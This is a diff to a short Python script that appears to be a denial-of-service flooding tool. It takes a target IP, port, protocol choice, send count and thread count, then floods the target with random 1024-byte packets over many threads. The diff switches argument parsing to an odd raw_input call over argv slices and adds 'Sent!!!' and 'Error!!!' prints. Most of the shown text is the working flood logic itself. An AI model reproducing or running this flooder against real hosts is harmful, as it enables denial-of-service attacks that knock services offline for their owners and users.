@@ -5,11 +5,11 @@ import socket
 import threading
 
 import sys
-ip = str(sys.argv[1])
-port = int(sys.argv[2])
-choice = str(sys.argv[3])
-times = int(sys.argv[4])
-threads = int(sys.argv[5])
+ip = str(raw_input(sys.argv[1:]))
+port = int(raw_input(sys.argv[2:]))
+choice = str(raw_input(sys.argv[3:]))
+times = int(raw_input(sys.argv[4:]))
+threads = int(raw_input(sys.argv[5:]))
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[*]","[!]","[#]"))
@@ -33,10 +33,11 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
+				print(i +" Sent!!!")
 			
 		except:
 			s.close()
-		
+		print("[!] Error!!!")
 
 for y in range(threads):
 	if choice == 'y':
